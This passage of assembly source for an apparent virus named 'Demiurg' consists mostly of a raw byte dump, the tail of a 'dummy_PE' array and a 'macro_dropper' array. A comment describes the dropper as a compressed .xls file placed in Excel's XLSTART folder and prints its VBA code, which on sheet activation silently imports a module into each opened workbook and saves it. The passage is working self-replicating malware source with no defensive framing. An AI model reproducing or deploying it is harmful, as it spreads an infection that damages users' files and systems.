	db 006h, 000h, 046h, 010h, 0E6h, 006h, 000h, 04Bh
	db 045h, 052h, 04Eh, 045h, 04Ch, 033h, 032h, 02Eh
	db 064h, 06Ch, 06Ch, 0E6h, 004h, 000h, 045h, 078h
	db 069h, 074h, 050h, 072h, 06Fh, 063h, 065h, 073h
	db 073h, 0E6h, 00Dh, 000h, 06Ah, 000h, 0FFh, 015h
	db 030h, 010h, 040h, 000h
dummy_PE_size           EQU ($ - dummy_PE)

dropper_size            EQU 17408


; ----- macro dropper code --------------------------------------------------
;
; This is a (compressed) .xls file that will be stored in the xlstart
; directory of excel. It contains the macro code that will stay resident in
; Excel and infects other .xls files:
;
; Attribute VB_Name = "Demiurg"
; Sub Auto_Open()
;     Application.OnSheetActivate = "Infect"
; End Sub
; Sub Infect()
;     Application.DisplayAlerts = False
;
;     lastchar = Asc(Mid$(ActiveWorkbook.Name, Len(ActiveWorkbook.Name), 1))
;     If Asc("1") <= lastchar And lastchar <= Asc("9") Then Exit Sub
;
;         For i = 1 To ActiveWorkbook.VBProject.VBComponents.count
;             If ActiveWorkbook.VBProject.VBComponents(i).Name = "Demiurg" Then Exit Sub
;         Next i
;
;     ActiveWorkbook.VBProject.VBComponents.Import ("C:\demiurg.sys")
;     ActiveWorkbook.Save
; End Sub

macro_dropper:
	db 0D0h, 0CFh, 011h, 0E0h, 0A1h, 0B1h, 01Ah, 0E1h
	db 0E6h, 010h, 000h, 03Eh, 000h, 003h, 000h, 0FEh
	db 0FFh, 009h, 000h, 006h, 0E6h, 00Bh, 000h, 001h
	db 000h, 000h, 000h, 001h, 0E6h, 008h, 000h, 010h
	db 000h, 000h, 002h, 000h, 000h, 000h, 002h, 000h
	db 000h, 000h, 0FEh, 0FFh, 0FFh, 0FFh, 0E6h, 008h
	db 000h, 0E6h, 0FFh, 0FFh, 0E6h, 0B1h, 0FFh, 0FDh
	db 0FFh, 0FFh, 0FFh, 009h, 000h, 000h, 000h, 013h
	db 000h, 000h, 000h, 004h, 000h, 000h, 000h, 005h
	db 000h, 000h, 000h, 006h, 000h, 000h, 000h, 007h
	db 000h, 000h, 000h, 008h, 000h, 000h, 000h, 00Ah
	db 000h, 000h, 000h, 019h, 000h, 000h, 000h, 00Bh
	db 000h, 000h, 000h, 00Ch, 000h, 000h, 000h, 00Dh
	db 000h, 000h, 000h, 00Eh, 000h, 000h, 000h, 00Fh
	db 000h, 000h, 000h, 010h, 000h, 000h, 000h, 011h
	db 000h, 000h, 000h, 012h, 000h, 000h, 000h, 014h
	db 000h, 000h, 000h, 0FEh, 0FFh, 0FFh, 0FFh, 015h
	db 000h, 000h, 000h, 016h, 000h, 000h, 000h, 017h
	db 000h, 000h, 000h, 018h, 000h, 000h, 000h, 01Ah
	db 000h, 000h, 000h, 01Dh, 000h, 000h, 000h, 01Bh
	db 000h, 000h, 000h, 01Ch, 000h, 000h, 000h, 01Eh
	db 000h, 000h, 000h, 0FEh, 0FFh, 0FFh, 0FFh, 0FEh
	db 0E6h, 0FFh, 0FFh, 0E6h, 088h, 0FFh, 052h, 000h
	db 06Fh, 000h, 06Fh, 000h, 074h, 000h, 020h, 000h
	db 045h, 000h, 06Eh, 000h, 074h, 000h, 072h, 000h
	db 079h, 0E6h, 02Dh, 000h, 016h, 000h, 005h, 000h
	db 0E6h, 008h, 0FFh, 002h, 000h, 000h, 000h, 020h
	db 008h, 002h, 0E6h, 005h, 000h, 0C0h, 0E6h, 006h
	db 000h, 046h, 0E6h, 004h, 000h, 040h, 026h, 06Ch
	db 034h, 03Fh, 085h, 0BFh, 001h, 0C0h, 0DDh, 03Ch
	db 04Ah, 03Fh, 085h, 0BFh, 001h, 003h, 000h, 000h
	db 000h, 080h, 02Eh, 0E6h, 006h, 000h, 057h, 000h
	db 06Fh, 000h, 072h, 000h, 06Bh, 000h, 062h, 000h
	db 06Fh, 000h, 06Fh, 000h, 06Bh, 0E6h, 031h, 000h
	db 012h, 000h, 002h, 001h, 00Dh, 000h, 000h, 000h
	db 0E6h, 008h, 0FFh, 0E6h, 028h, 000h, 092h, 00Ah
	db 0E6h, 006h, 000h, 05Fh, 000h, 056h, 000h, 042h
	db 000h, 041h, 000h, 05Fh, 000h, 050h, 000h, 052h
	db 000h, 04Fh, 000h, 04Ah, 000h, 045h, 000h, 043h
	db 000h, 054h, 000h, 05Fh, 000h, 043h, 000h, 055h
	db 000h, 052h, 0E6h, 021h, 000h, 022h, 000h, 001h
	db 001h, 001h, 000h, 000h, 000h, 00Bh, 000h, 000h
	db 000h, 00Ah, 0E6h, 017h, 000h, 0A0h, 03Ch, 035h
	db 04Ah, 03Fh, 085h, 0BFh, 001h, 0C0h, 0DDh, 03Ch
	db 04Ah, 03Fh, 085h, 0BFh, 001h, 0E6h, 00Ch, 000h
	db 056h, 000h, 042h, 000h, 041h, 0E6h, 03Bh, 000h
	db 008h, 000h, 001h, 000h, 0E6h, 008h, 0FFh, 005h
	db 0E6h, 017h, 000h, 0A0h, 03Ch, 035h, 04Ah, 03Fh
	db 085h, 0BFh, 001h, 0A0h, 03Ch, 035h, 04Ah, 03Fh
	db 085h, 0BFh, 001h, 0E6h, 00Ch, 000h, 001h, 000h
	db 000h, 000h, 002h, 000h, 000h, 000h, 003h, 000h
	db 000h, 000h, 004h, 000h, 000h, 000h, 005h, 000h
	db 000h, 000h, 006h, 000h, 000h, 000h, 007h, 000h
	db 000h, 000h, 008h, 000h, 000h, 000h, 009h, 000h
	db 000h, 000h, 00Ah, 000h, 000h, 000h, 00Bh, 000h
	db 000h, 000h, 00Ch, 000h, 000h, 000h, 00Dh, 000h
	db 000h, 000h, 00Eh, 000h, 000h, 000h, 00Fh, 000h
	db 000h, 000h, 010h, 000h, 000h, 000h, 011h, 000h
	db 000h, 000h, 012h, 000h, 000h, 000h, 013h, 000h
	db 000h, 000h, 014h, 000h, 000h, 000h, 015h, 000h
	db 000h, 000h, 016h, 000h, 000h, 000h, 017h, 000h
	db 000h, 000h, 018h, 000h, 000h, 000h, 019h, 000h
	db 000h, 000h, 01Ah, 000h, 000h, 000h, 01Bh, 000h
	db 000h, 000h, 01Ch, 000h, 000h, 000h, 01Dh, 000h
	db 000h, 000h, 01Eh, 000h, 000h, 000h, 01Fh, 000h
	db 000h, 000h, 020h, 000h, 000h, 000h, 021h, 000h
	db 000h, 000h, 022h, 000h, 000h, 000h, 023h, 000h
	db 000h, 000h, 024h, 000h, 000h, 000h, 025h, 000h
	db 000h, 000h, 026h, 000h, 000h, 000h, 027h, 000h
	db 000h, 000h, 028h, 000h, 000h, 000h, 029h, 000h
	db 000h, 000h, 02Ah, 000h, 000h, 000h, 0FEh, 0FFh
	db 0FFh, 0FFh, 02Ch, 000h, 000h, 000h, 02Dh, 000h
	db 000h, 000h, 02Eh, 000h, 000h, 000h, 02Fh, 000h
	db 000h, 000h, 030h, 000h, 000h, 000h, 031h, 000h
	db 000h, 000h, 032h, 000h, 000h, 000h, 033h, 000h
	db 000h, 000h, 034h, 000h, 000h, 000h, 035h, 000h
	db 000h, 000h, 036h, 000h, 000h, 000h, 037h, 000h
	db 000h, 000h, 038h, 000h, 000h, 000h, 039h, 000h
	db 000h, 000h, 03Ah, 000h, 000h, 000h, 0FEh, 0FFh
	db 0FFh, 0FFh, 03Ch, 000h, 000h, 000h, 03Dh, 000h
	db 000h, 000h, 03Eh, 000h, 000h, 000h, 03Fh, 000h
	db 000h, 000h, 040h, 000h, 000h, 000h, 041h, 000h
	db 000h, 000h, 042h, 000h, 000h, 000h, 043h, 000h
	db 000h, 000h, 044h, 000h, 000h, 000h, 045h, 000h
	db 000h, 000h, 046h, 000h, 000h, 000h, 047h, 000h
	db 000h, 000h, 048h, 000h, 000h, 000h, 049h, 000h
	db 000h, 000h, 0FEh, 0FFh, 0FFh, 0FFh, 04Bh, 000h
	db 000h, 000h, 04Ch, 000h, 000h, 000h, 04Dh, 000h
	db 000h, 000h, 04Eh, 000h, 000h, 000h, 04Fh, 000h
	db 000h, 000h, 050h, 000h, 000h, 000h, 051h, 000h
	db 000h, 000h, 052h, 000h, 000h, 000h, 053h, 000h
	db 000h, 000h, 054h, 000h, 000h, 000h, 055h, 000h
	db 000h, 000h, 056h, 000h, 000h, 000h, 057h, 000h
	db 000h, 000h, 058h, 000h, 000h, 000h, 059h, 000h
	db 000h, 000h, 05Ah, 000h, 000h, 000h, 05Bh, 000h
	db 000h, 000h, 05Ch, 000h, 000h, 000h, 05Dh, 000h
	db 000h, 000h, 05Eh, 000h, 000h, 000h, 05Fh, 000h
	db 000h, 000h, 060h, 000h, 000h, 000h, 061h, 000h
	db 000h, 000h, 062h, 000h, 000h, 000h, 063h, 000h
	db 000h, 000h, 064h, 000h, 000h, 000h, 065h, 000h
	db 000h, 000h, 066h, 000h, 000h, 000h, 0FEh, 0FFh
	db 0FFh, 0FFh, 068h, 000h, 000h, 000h, 069h, 000h
	db 000h, 000h, 06Ah, 000h, 000h, 000h, 06Bh, 000h
	db 000h, 000h, 06Ch, 000h, 000h, 000h, 06Dh, 000h
	db 000h, 000h, 06Eh, 000h, 000h, 000h, 06Fh, 000h
	db 000h, 000h, 070h, 000h, 000h, 000h, 071h, 000h
	db 000h, 000h, 072h, 000h, 000h, 000h, 073h, 000h
	db 000h, 000h, 074h, 000h, 000h, 000h, 075h, 000h
	db 000h, 000h, 076h, 000h, 000h, 000h, 077h, 000h
	db 000h, 000h, 078h, 000h, 000h, 000h, 079h, 000h
	db 000h, 000h, 07Ah, 000h, 000h, 000h, 07Bh, 000h
	db 000h, 000h, 07Ch, 000h, 000h, 000h, 07Dh, 000h
	db 000h, 000h, 07Eh, 000h, 000h, 000h, 07Fh, 000h
	db 000h, 000h, 080h, 000h, 000h, 000h, 009h, 008h
	db 010h, 000h, 000h, 006h, 005h, 000h, 0D3h, 010h
	db 0CCh, 007h, 041h, 000h, 000h, 000h, 006h, 000h
	db 000h, 000h, 0E1h, 000h, 002h, 000h, 0B0h, 004h
	db 0C1h, 000h, 002h, 000h, 000h, 000h, 0E2h, 000h
	db 000h, 000h, 05Ch, 000h, 070h, 000h, 001h, 000h
	db 000h, 042h, 0E6h, 06Ch, 020h, 042h, 000h, 002h
	db 000h, 0B0h, 004h, 061h, 001h, 002h, 000h, 000h
	db 000h, 03Dh, 001h, 002h, 000h, 001h, 000h, 0D3h
	db 000h, 000h, 000h, 0BAh, 001h, 014h, 000h, 011h
	db 000h, 000h, 044h, 069h, 065h, 073h, 065h, 041h
	db 072h, 062h, 065h, 069h, 074h, 073h, 06Dh, 061h
	db 070h, 070h, 065h, 09Ch, 000h, 002h, 000h, 00Eh
	db 000h, 019h, 000h, 002h, 000h, 000h, 000h, 012h
	db 000h, 002h, 000h, 000h, 000h, 013h, 000h, 002h
	db 000h, 000h, 000h, 0AFh, 001h, 002h, 000h, 000h
	db 000h, 0BCh, 001h, 002h, 000h, 000h, 000h, 03Dh
	db 000h, 012h, 000h, 0F0h, 000h, 087h, 000h, 0DCh
	db 023h, 094h, 011h, 039h, 0E6h, 005h, 000h, 001h
	db 000h, 058h, 002h, 040h, 000h, 002h, 000h, 000h
	db 000h, 08Dh, 000h, 002h, 000h, 000h, 000h, 022h
	db 000h, 002h, 000h, 000h, 000h, 00Eh, 000h, 002h
	db 000h, 001h, 000h, 0B7h, 001h, 002h, 000h, 000h
	db 000h, 0DAh, 000h, 002h, 000h, 000h, 000h, 031h
	db 000h, 01Ah, 000h, 0C8h, 000h, 000h, 000h, 0FFh
	db 07Fh, 090h, 001h, 0E6h, 006h, 000h, 005h, 001h
	db 041h, 000h, 072h, 000h, 069h, 000h, 061h, 000h
	db 06Ch, 000h, 031h, 000h, 01Ah, 000h, 0C8h, 000h
	db 000h, 000h, 0FFh, 07Fh, 090h, 001h, 0E6h, 006h
	db 000h, 005h, 001h, 041h, 000h, 072h, 000h, 069h
	db 000h, 061h, 000h, 06Ch, 000h, 031h, 000h, 01Ah
	db 000h, 0C8h, 000h, 000h, 000h, 0FFh, 07Fh, 090h
	db 001h, 0E6h, 006h, 000h, 005h, 001h, 041h, 000h
	db 072h, 000h, 069h, 000h, 061h, 000h, 06Ch, 000h
	db 031h, 000h, 01Ah, 000h, 0C8h, 000h, 000h, 000h
	db 0FFh, 07Fh, 090h, 001h, 0E6h, 006h, 000h, 005h
	db 001h, 041h, 000h, 072h, 000h, 069h, 000h, 061h
	db 000h, 06Ch, 000h, 01Eh, 004h, 01Eh, 000h, 005h
	db 000h, 019h, 000h, 000h, 022h, 0F6h, 053h, 022h
	db 05Ch, 020h, 023h, 02Ch, 023h, 023h, 030h, 03Bh
	db 05Ch, 02Dh, 022h, 0F6h, 053h, 022h, 05Ch, 020h
	db 023h, 02Ch, 023h, 023h, 030h, 01Eh, 004h, 023h
	db 000h, 006h, 000h, 01Eh, 000h, 000h, 022h, 0F6h
	db 053h, 022h, 05Ch, 020h, 023h, 02Ch, 023h, 023h
	db 030h, 03Bh, 05Bh, 052h, 065h, 064h, 05Dh, 05Ch
	db 02Dh, 022h, 0F6h, 053h, 022h, 05Ch, 020h, 023h
	db 02Ch, 023h, 023h, 030h, 01Eh, 004h, 024h, 000h
	db 007h, 000h, 01Fh, 000h, 000h, 022h, 0F6h, 053h
	db 022h, 05Ch, 020h, 023h, 02Ch, 023h, 023h, 030h
	db 02Eh, 030h, 030h, 03Bh, 05Ch, 02Dh, 022h, 0F6h
	db 053h, 022h, 05Ch, 020h, 023h, 02Ch, 023h, 023h
	db 030h, 02Eh, 030h, 030h, 01Eh, 004h, 029h, 000h
	db 008h, 000h, 024h, 000h, 000h, 022h, 0F6h, 053h
	db 022h, 05Ch, 020h, 023h, 02Ch, 023h, 023h, 030h
	db 02Eh, 030h, 030h, 03Bh, 05Bh, 052h, 065h, 064h
	db 05Dh, 05Ch, 02Dh, 022h, 0F6h, 053h, 022h, 05Ch
	db 020h, 023h, 02Ch, 023h, 023h, 030h, 02Eh, 030h
	db 030h, 01Eh, 004h, 03Eh, 000h, 02Ah, 000h, 039h
	db 000h, 000h, 05Fh, 02Dh, 022h, 0F6h, 053h, 022h
	db 05Ch, 020h, 02Ah, 020h, 023h, 02Ch, 023h, 023h
	db 030h, 05Fh, 02Dh, 03Bh, 05Ch, 02Dh, 022h, 0F6h
	db 053h, 022h, 05Ch, 020h, 02Ah, 020h, 023h, 02Ch
	db 023h, 023h, 030h, 05Fh, 02Dh, 03Bh, 05Fh, 02Dh
	db 022h, 0F6h, 053h, 022h, 05Ch, 020h, 02Ah, 020h
	db 022h, 02Dh, 022h, 05Fh, 02Dh, 03Bh, 05Fh, 02Dh
	db 040h, 05Fh, 02Dh, 01Eh, 004h, 02Ch, 000h, 029h
	db 000h, 027h, 000h, 000h, 05Fh, 02Dh, 02Ah, 020h
	db 023h, 02Ch, 023h, 023h, 030h, 05Fh, 02Dh, 03Bh
	db 05Ch, 02Dh, 02Ah, 020h, 023h, 02Ch, 023h, 023h
	db 030h, 05Fh, 02Dh, 03Bh, 05Fh, 02Dh, 02Ah, 020h
	db 022h, 02Dh, 022h, 05Fh, 02Dh, 03Bh, 05Fh, 02Dh
	db 040h, 05Fh, 02Dh, 01Eh, 004h, 046h, 000h, 02Ch
	db 000h, 041h, 000h, 000h, 05Fh, 02Dh, 022h, 0F6h
	db 053h, 022h, 05Ch, 020h, 02Ah, 020h, 023h, 02Ch
	db 023h, 023h, 030h, 02Eh, 030h, 030h, 05Fh, 02Dh
	db 03Bh, 05Ch, 02Dh, 022h, 0F6h, 053h, 022h, 05Ch
	db 020h, 02Ah, 020h, 023h, 02Ch, 023h, 023h, 030h
	db 02Eh, 030h, 030h, 05Fh, 02Dh, 03Bh, 05Fh, 02Dh
	db 022h, 0F6h, 053h, 022h, 05Ch, 020h, 02Ah, 020h
	db 022h, 02Dh, 022h, 03Fh, 03Fh, 05Fh, 02Dh, 03Bh
	db 05Fh, 02Dh, 040h, 05Fh, 02Dh, 01Eh, 004h, 034h
	db 000h, 02Bh, 000h, 02Fh, 000h, 000h, 05Fh, 02Dh
	db 02Ah, 020h, 023h, 02Ch, 023h, 023h, 030h, 02Eh
	db 030h, 030h, 05Fh, 02Dh, 03Bh, 05Ch, 02Dh, 02Ah
	db 020h, 023h, 02Ch, 023h, 023h, 030h, 02Eh, 030h
	db 030h, 05Fh, 02Dh, 03Bh, 05Fh, 02Dh, 02Ah, 020h
	db 022h, 02Dh, 022h, 03Fh, 03Fh, 05Fh, 02Dh, 03Bh
	db 05Fh, 02Dh, 040h, 05Fh, 02Dh, 0E0h, 000h, 014h
	db 0E6h, 005h, 000h, 0F5h, 0FFh, 020h, 0E6h, 00Bh
	db 000h, 0C0h, 020h, 0E0h, 000h, 014h, 000h, 001h
	db 000h, 000h, 000h, 0F5h, 0FFh, 020h, 000h, 000h
	db 0F4h, 0E6h, 008h, 000h, 0C0h, 020h, 0E0h, 000h
	db 014h, 000h, 001h, 000h, 000h, 000h, 0F5h, 0FFh
	db 020h, 000h, 000h, 0F4h, 0E6h, 008h, 000h, 0C0h
	db 020h, 0E0h, 000h, 014h, 000h, 002h, 000h, 000h
	db 000h, 0F5h, 0FFh, 020h, 000h, 000h, 0F4h, 0E6h
	db 008h, 000h, 0C0h, 020h, 0E0h, 000h, 014h, 000h
	db 002h, 000h, 000h, 000h, 0F5h, 0FFh, 020h, 000h
	db 000h, 0F4h, 0E6h, 008h, 000h, 0C0h, 020h, 0E0h
	db 000h, 014h, 0E6h, 005h, 000h, 0F5h, 0FFh, 020h
	db 000h, 000h, 0F4h, 0E6h, 008h, 000h, 0C0h, 020h
	db 0E0h, 000h, 014h, 0E6h, 005h, 000h, 0F5h, 0FFh
	db 020h, 000h, 000h, 0F4h, 0E6h, 008h, 000h, 0C0h
	db 020h, 0E0h, 000h, 014h, 0E6h, 005h, 000h, 0F5h
	db 0FFh, 020h, 000h, 000h, 0F4h, 0E6h, 008h, 000h
	db 0C0h, 020h, 0E0h, 000h, 014h, 0E6h, 005h, 000h
	db 0F5h, 0FFh, 020h, 000h, 000h, 0F4h, 0E6h, 008h
	db 000h, 0C0h, 020h, 0E0h, 000h, 014h, 0E6h, 005h
	db 000h, 0F5h, 0FFh, 020h, 000h, 000h, 0F4h, 0E6h
	db 008h, 000h, 0C0h, 020h, 0E0h, 000h, 014h, 0E6h
	db 005h, 000h, 0F5h, 0FFh, 020h, 000h, 000h, 0F4h
	db 0E6h, 008h, 000h, 0C0h, 020h, 0E0h, 000h, 014h
	db 0E6h, 005h, 000h, 0F5h, 0FFh, 020h, 000h, 000h
	db 0F4h, 0E6h, 008h, 000h, 0C0h, 020h, 0E0h, 000h
	db 014h, 0E6h, 005h, 000h, 0F5h, 0FFh, 020h, 000h
	db 000h, 0F4h, 0E6h, 008h, 000h, 0C0h, 020h, 0E0h
	db 000h, 014h, 0E6h, 005h, 000h, 0F5h, 0FFh, 020h
	db 000h, 000h, 0F4h, 0E6h, 008h, 000h, 0C0h, 020h
	db 0E0h, 000h, 014h, 0E6h, 005h, 000h, 0F5h, 0FFh
	db 020h, 000h, 000h, 0F4h, 0E6h, 008h, 000h, 0C0h
	db 020h, 0E0h, 000h, 014h, 0E6h, 005h, 000h, 001h
	db 000h, 020h, 0E6h, 00Bh, 000h, 0C0h, 020h, 0E0h
	db 000h, 014h, 000h, 001h, 000h, 02Bh, 000h, 0F5h
	db 0FFh, 020h, 000h, 000h, 0F8h, 0E6h, 008h, 000h
	db 0C0h, 020h, 0E0h, 000h, 014h, 000h, 001h, 000h
	db 029h, 000h, 0F5h, 0FFh, 020h, 000h, 000h, 0F8h
	db 0E6h, 008h, 000h, 0C0h, 020h, 0E0h, 000h, 014h
	db 000h, 001h, 000h, 009h, 000h, 0F5h, 0FFh, 020h
	db 000h, 000h, 0F8h, 0E6h, 008h, 000h, 0C0h, 020h
	db 0E0h, 000h, 014h, 000h, 001h, 000h, 02Ch, 000h
	db 0F5h, 0FFh, 020h, 000h, 000h, 0F8h, 0E6h, 008h
	db 000h, 0C0h, 020h, 0E0h, 000h, 014h, 000h, 001h
	db 000h, 02Ah, 000h, 0F5h, 0FFh, 020h, 000h, 000h
	db 0F8h, 0E6h, 008h, 000h, 0C0h, 020h, 093h, 002h
	db 004h, 000h, 010h, 080h, 003h, 0FFh, 093h, 002h
	db 004h, 000h, 011h, 080h, 006h, 0FFh, 093h, 002h
	db 004h, 000h, 012h, 080h, 005h, 0FFh, 093h, 002h
	db 004h, 000h, 000h, 080h, 000h, 0FFh, 093h, 002h
	db 004h, 000h, 013h, 080h, 004h, 0FFh, 093h, 002h
	db 004h, 000h, 014h, 080h, 007h, 0FFh, 060h, 001h
	db 002h, 000h, 001h, 000h, 085h, 000h, 010h, 000h
	db 086h, 009h, 0E6h, 004h, 000h, 008h, 000h, 054h
	db 061h, 062h, 065h, 06Ch, 06Ch, 065h, 031h, 08Ch
	db 000h, 004h, 000h, 031h, 000h, 02Bh, 000h, 0FCh
	db 000h, 008h, 0E6h, 009h, 000h, 0FFh, 000h, 0FAh
	db 003h, 008h, 000h, 0FFh, 0FFh, 040h, 000h, 000h
	db 000h, 040h, 010h, 045h, 000h, 000h, 000h, 040h
	db 000h, 001h, 000h, 000h, 000h, 00Ch, 000h, 040h
	db 000h, 051h, 004h, 0E6h, 00Ah, 000h, 085h, 084h
	db 0F7h, 0BFh, 001h, 000h, 000h, 000h, 09Ch, 084h
	db 0F7h, 0BFh, 000h, 000h, 040h, 000h, 001h, 000h
	db 000h, 000h, 038h, 0C6h, 062h, 0E6h, 005h, 000h
	db 001h, 0E6h, 007h, 000h, 005h, 040h, 000h, 080h
	db 002h, 094h, 0F7h, 0BFh, 000h, 000h, 040h, 000h
	db 004h, 000h, 000h, 000h, 0E0h, 006h, 09Ch, 000h
	db 00Ah, 000h, 000h, 000h, 020h, 000h, 000h, 000h
	db 0FAh, 07Eh, 070h, 030h, 00Ah, 000h, 000h, 000h
	db 00Ah, 000h, 000h, 000h, 007h, 00Ch, 000h, 000h
	db 001h, 000h, 000h, 000h, 0E8h, 006h, 09Ch, 000h
	db 0B4h, 0C5h, 062h, 0E6h, 00Dh, 000h, 0E6h, 008h
	db 0FFh, 09Ch, 030h, 075h, 0E6h, 005h, 000h, 069h
	db 000h, 075h, 000h, 0FFh, 0FFh, 0FFh, 0E7h, 0E6h
	db 004h, 000h, 05Ch, 000h, 063h, 000h, 005h, 000h
	db 000h, 000h, 05Ch, 000h, 064h, 000h, 065h, 000h
	db 06Dh, 000h, 003h, 0E6h, 007h, 000h, 028h, 0D0h
	db 09Dh, 030h, 0E6h, 008h, 000h, 0E6h, 004h, 0FFh
	db 0E6h, 014h, 000h, 002h, 007h, 002h, 002h, 0E6h
	db 004h, 0FFh, 0E6h, 004h, 000h, 003h, 000h, 000h
	db 000h, 070h, 000h, 07Eh, 030h, 0C3h, 07Ch, 070h
	db 030h, 004h, 000h, 000h, 000h, 004h, 0E6h, 007h
	db 000h, 001h, 000h, 000h, 000h, 04Eh, 087h, 075h
	db 000h, 082h, 0D8h, 07Eh, 030h, 003h, 000h, 000h
	db 000h, 003h, 0E6h, 00Bh, 000h, 061h, 07Ah, 070h
	db 030h, 0D4h, 006h, 09Ch, 000h, 00Ah, 000h, 000h
	db 000h, 0A0h, 0C5h, 062h, 000h, 00Ah, 000h, 000h
	db 000h, 001h, 000h, 000h, 000h, 00Ah, 000h, 000h
	db 000h, 0A0h, 0C5h, 062h, 000h, 0D4h, 006h, 09Ch
	db 000h, 00Ah, 0E6h, 00Bh, 000h, 028h, 0D0h, 09Dh
	db 030h, 0E6h, 008h, 000h, 002h, 000h, 000h, 000h
	db 0FFh, 003h, 000h, 000h, 001h, 000h, 000h, 000h
	db 001h, 000h, 000h, 000h, 001h, 000h, 000h, 000h
	db 020h, 010h, 000h, 000h, 018h, 0E6h, 007h, 000h
	db 084h, 0F6h, 053h, 030h, 05Ch, 0C5h, 062h, 000h
	db 05Dh, 0E6h, 007h, 000h, 002h, 000h, 0C8h, 030h
	db 000h, 000h, 0C5h, 030h, 0E6h, 004h, 000h, 061h
	db 07Ah, 070h, 030h, 04Ch, 087h, 075h, 000h, 004h
	db 000h, 000h, 000h, 07Eh, 00Eh, 002h, 002h, 0E1h
	db 03Ch, 06Dh, 030h, 016h, 000h, 0C8h, 030h, 0D3h
	db 000h, 000h, 000h, 09Eh, 0C5h, 062h, 000h, 0FCh
	db 000h, 000h, 000h, 009h, 000h, 000h, 000h, 0CDh
	db 015h, 004h, 030h, 000h, 000h, 0C5h, 030h, 004h
	db 02Ah, 0C8h, 030h, 039h, 015h, 000h, 030h, 007h
	db 00Ch, 000h, 000h, 001h, 000h, 000h, 000h, 0D4h
	db 006h, 09Ch, 000h, 00Ah, 000h, 000h, 000h, 0A0h
	db 0C5h, 062h, 000h, 00Ah, 000h, 000h, 000h, 0D0h
	db 006h, 09Ch, 0E6h, 005h, 000h, 0A0h, 0C7h, 062h
	db 000h, 05Dh, 0E6h, 007h, 000h, 08Eh, 08Fh, 00Fh
	db 030h, 0E6h, 004h, 000h, 09Ch, 0C5h, 062h, 000h
	db 00Bh, 000h, 000h, 000h, 0E6h, 004h, 0FFh, 070h
	db 006h, 09Ch, 000h, 0DCh, 0C7h, 062h, 000h, 004h
	db 000h, 000h, 000h, 00Bh, 000h, 057h, 000h, 0E4h
	db 000h, 068h, 000h, 072h, 000h, 075h, 000h, 06Eh
	db 000h, 067h, 000h, 020h, 000h, 05Bh, 000h, 030h
	db 000h, 05Dh, 000h, 000h, 000h, 05Fh, 000h, 000h
	db 000h, 001h, 000h, 008h, 000h, 09Ah, 00Dh, 0E6h
	db 004h, 000h, 0AEh, 082h, 070h, 030h, 007h, 00Ch
	db 000h, 000h, 001h, 000h, 000h, 000h, 04Ch, 087h
	db 075h, 000h, 004h, 000h, 000h, 000h, 080h, 0D8h
	db 07Eh, 030h, 004h, 000h, 000h, 000h, 0AEh, 082h
	db 070h, 030h, 007h, 00Ch, 000h, 000h, 001h, 000h
	db 000h, 000h, 064h, 000h, 098h, 000h, 002h, 000h
	db 000h, 000h, 065h, 010h, 000h, 030h, 064h, 000h
	db 098h, 000h, 096h, 06Ah, 054h, 030h, 004h, 000h
	db 000h, 000h, 0D9h, 010h, 000h, 030h, 096h, 06Ah
	db 054h, 030h, 052h, 070h, 054h, 030h, 0C2h, 0C8h
	db 010h, 030h, 096h, 01Ah, 09Ah, 000h, 050h, 000h
	db 098h, 000h, 065h, 010h, 000h, 030h, 050h, 000h
	db 098h, 000h, 096h, 01Ah, 09Ah, 000h, 002h, 000h
	db 000h, 000h, 0DDh, 088h, 00Fh, 030h, 096h, 01Ah
	db 09Ah, 000h, 050h, 000h, 098h, 000h, 001h, 000h
	db 000h, 000h, 060h, 01Ah, 09Ah, 0E6h, 005h, 000h
	db 008h, 000h, 098h, 000h, 0FCh, 001h, 098h, 0E6h
	db 009h, 000h, 0A4h, 01Ah, 09Ah, 0E6h, 00Dh, 000h
	db 03Fh, 0E6h, 007h, 000h, 0B0h, 0C6h, 062h, 000h
	db 039h, 086h, 00Fh, 030h, 006h, 000h, 000h, 000h
	db 060h, 01Ah, 09Ah, 000h, 02Dh, 000h, 000h, 000h
	db 007h, 000h, 000h, 000h, 006h, 002h, 098h, 000h
	db 0DEh, 0C7h, 062h, 000h, 0DCh, 0C7h, 062h, 000h
	db 008h, 000h, 098h, 000h, 007h, 000h, 000h, 000h
	db 03Dh, 000h, 000h, 000h, 0CEh, 05Ah, 054h, 030h
	db 0E6h, 004h, 000h, 065h, 010h, 000h, 030h, 070h
	db 06Ah, 054h, 030h, 0ECh, 004h, 09Ah, 000h, 04Ch
	db 000h, 000h, 000h, 0D9h, 010h, 000h, 030h, 0ECh
	db 004h, 09Ah, 000h, 070h, 06Ah, 054h, 030h, 04Ch
	db 000h, 000h, 000h, 0CEh, 05Ah, 054h, 030h, 0BAh
	db 0C7h, 062h, 000h, 0C0h, 0C7h, 062h, 0E6h, 00Dh
	db 000h, 0A2h, 0C7h, 010h, 030h, 009h, 004h, 0E6h
	db 00Ah, 000h, 024h, 000h, 000h, 000h, 0FCh, 0E7h
	db 062h, 000h, 0F3h, 083h, 00Fh, 030h, 04Ch, 0C7h
	db 062h, 000h, 001h, 000h, 000h, 000h, 010h, 0A3h
	db 09Ah, 0E6h, 009h, 000h, 0C0h, 0C7h, 062h, 0E6h
	db 005h, 000h, 010h, 0A3h, 09Ah, 0E6h, 005h, 000h
	db 0F4h, 0C6h, 062h, 000h, 06Eh, 083h, 00Fh, 030h
	db 0E6h, 024h, 000h, 038h, 005h, 09Ch, 000h, 0DCh
	db 0C7h, 062h, 000h, 014h, 000h, 000h, 000h, 0E0h
	db 000h, 000h, 000h, 0A8h, 0C7h, 062h, 000h, 0FCh
	db 0E7h, 062h, 0E6h, 005h, 000h, 01Ch, 0A2h, 09Ah
	db 000h, 0C4h, 0C7h, 062h, 000h, 09Ah, 020h, 000h
	db 030h, 01Ch, 0A2h, 09Ah, 000h, 073h, 090h, 00Ah
	db 000h, 000h, 000h, 009h, 008h, 010h, 000h, 000h
	db 006h, 010h, 000h, 0D3h, 010h, 0CCh, 007h, 041h
	db 000h, 000h, 000h, 006h, 000h, 000h, 000h, 00Bh
	db 002h, 010h, 0E6h, 00Dh, 000h, 03Eh, 00Ah, 000h
	db 000h, 00Dh, 000h, 002h, 000h, 001h, 000h, 00Ch
	db 000h, 002h, 000h, 064h, 000h, 00Fh, 000h, 002h
	db 000h, 001h, 000h, 011h, 000h, 002h, 000h, 000h
	db 000h, 010h, 000h, 008h, 000h, 0FCh, 0A9h, 0F1h
	db 0D2h, 04Dh, 062h, 050h, 03Fh, 05Fh, 000h, 002h
	db 000h, 001h, 000h, 02Ah, 000h, 002h, 000h, 000h
